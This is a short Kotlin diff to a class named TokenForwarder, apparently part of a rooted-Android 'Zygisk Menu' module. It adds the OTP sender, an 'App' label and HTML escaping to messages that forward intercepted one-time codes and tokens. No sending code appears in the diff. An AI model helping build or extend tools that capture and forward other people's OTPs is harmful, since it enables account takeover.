@@ -57,10 +57,18 @@ class TokenForwarder(private val configManager: ConfigManager) {
             appendLine("📱 <b>Zygisk Menu</b>")
             appendLine("<b>Mode By @hivirtus @liqdy</b>")
             appendLine("────────────────")
+            appendLine("📞 <b>From:</b> ${escapeHtml(otp.sender.ifBlank { "Unknown" })}")
             appendLine("📞 <b>To:</b> $toPhone")
-            appendLine("💬 <b>Message:</b> $messageLabel")
-            append(tokenBody)
+            appendLine("💬 <b>App:</b> $messageLabel")
+            append(escapeHtml(tokenBody))
         }
+    }
+
+    private fun escapeHtml(text: String): String {
+        return text
+            .replace("&", "&amp;")
+            .replace("<", "&lt;")
+            .replace(">", "&gt;")
     }
 
     private fun formatSenderLabel(sender: String): String {
